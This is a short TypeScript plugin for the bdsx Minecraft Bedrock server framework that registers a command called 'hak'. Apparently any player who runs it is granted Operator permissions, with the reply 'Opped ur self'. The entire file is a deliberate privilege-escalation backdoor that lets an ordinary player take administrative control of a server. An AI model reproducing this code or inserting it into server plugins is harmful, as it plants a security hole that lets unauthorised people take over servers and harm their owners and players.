import { CommandPermissionLevel } from "bdsx/bds/command";
import { command } from "bdsx/command";

command.register('hak', 'get op').overload(async(param, origin, output)=>{
    const actor = origin.getEntity();
    if (!actor?.isPlayer()) {
        console.log("run this command only in-game");
        return;
    }
    actor.setPermissions(CommandPermissionLevel.Operator);
    actor.sendMessage("Opped ur self");
}, {});
